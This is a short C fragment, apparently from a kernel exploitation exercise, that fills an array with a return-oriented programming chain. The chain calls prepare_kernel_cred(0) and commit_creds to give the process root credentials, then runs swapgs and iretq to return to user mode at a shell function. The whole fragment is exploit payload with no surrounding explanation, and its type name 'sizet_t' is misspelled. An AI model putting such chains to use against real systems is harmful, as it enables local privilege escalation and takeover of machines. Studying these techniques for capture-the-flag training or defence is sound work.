sizet_t rop[32] = {0};

rop[0] 	= 0xffffffff810d238d;   // pop rdi; ret;
rop[1] 	= 0;
rop[2] 	= prepare_kernel_cred;
rop[3] 	= 0xffffffff810676e5;   // pop rdx; pop rcx; ret
rop[4] 	= commit_creds;
rop[5] 	= 0;
rop[6] 	= 0xffffffff8180c4a2;   // mov rdi, rax; call rdx;
rop[7] 	= 0;
rop[8] 	= 0xffffffff81063694;   // swapgs; pop rbp; ret;
rop[9] 	= 0;
rop[10]	= 0xffffffff814e35ef;   // iretq; ret;
rop[11]	= &shell;
rop[12]	= rv.user_cs;
rop[13]	= rv.user_rflags;
rop[14]	= rv.user_rsp;
rop[15]	= rv.user_ss;
